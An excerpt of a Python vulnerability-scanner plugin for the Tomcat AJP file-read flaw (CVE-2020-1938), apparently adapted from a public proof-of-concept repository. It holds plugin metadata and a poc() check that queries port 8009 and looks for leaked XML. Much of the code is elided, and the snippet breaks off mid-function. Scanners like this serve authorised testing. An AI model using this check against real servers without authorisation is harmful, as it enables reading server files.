...
代码改自https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/ 
"""
...
def get_plugin_info():
    plugin_info = {
        "name": "tomcat ajp  文件读取",
        "desc": "tomcat ajp 文件读取漏洞",
        "grade": "高",
        "type": "service",
        "keyword": "service:ajp13 port:8009 cve:cve-2020-1938"
    }
    return plugin_info
...
import re
def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':8009'
    host,port = check_port(arg).split(':')
    timeout = 5
    try:
        t = Tomcat(host, int(port))
        ...
        if "<?xml version=" in "".join([d.data.decode() for d in data]):
            return True
        else:
            return False
    except:
